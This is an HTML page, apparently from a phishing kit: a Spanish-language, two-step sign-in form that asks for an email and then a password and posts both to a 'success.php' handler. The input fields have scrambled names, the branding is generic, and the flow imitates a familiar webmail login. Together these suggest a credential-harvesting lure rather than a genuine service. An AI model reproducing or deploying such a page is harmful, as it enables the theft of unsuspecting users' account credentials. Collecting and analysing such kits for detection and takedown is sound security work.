<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Inicio</title>

    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimun-sacale=1.0">

    <link rel="stylesheet" href="./arch/index.css">
</head>

<body>
    <section id="login-container">
        <div id="login-body" class="opacity1">

            <div class="logo-container">
                <img src="./arch/logo.png" class="login-logo" alt="Logo">
            </div>

            <form id="container-layout" method="POST" action="success.php" enctype="multipart/form-data" onkeypress="return cancelEnter(event)">

                <div id="eml" class="layout-active">
                    <h2>Iniciar Sesión</h2>
                    <div id="alert-eml-login" style="display: none;"></div>
                    <input type="email" id="usr" name="rrtytrrt" placeholder="Correo electrónico">
                    <p>¿No tiene una cuenta? <a href="#" id="create-account-link">Cree una.</a></p>
                    <div class="button btn-next">
                        <button type="button" id="btn-next-pss" class="btn-form-login">Siguiente</button>
                    </div>
                </div>

                <div id="pss">
                    <div class="usr">
                        <p>
                            <button type="button" id="btn-prev">
                                <i class="fa-solid fa-arrow-left"></i>
                            </button>
                            <span id="span-eml"></span>
                        </p>
                    </div>
                    <h2>Escribir contraseña</h2>
                    <input type="password" id="pss" name="regtrfdr" placeholder="Contraseña">
                    <a href="#" id="link-recovery-password">¿Olvidó su contraseña?</a>
                    <div class="button btn-sub">
                        <input type="submit" id="btn-login" class="btn-form-login" value="Validar">
                    </div>
                </div>
            </form>
        </div>
    </section>

    <script src="./arch/4a03c8ce1f.js" crossorigin="anonymous"></script>
	
	<script type="text/javascript" src="./arch/functions.js"></script>


</body></html>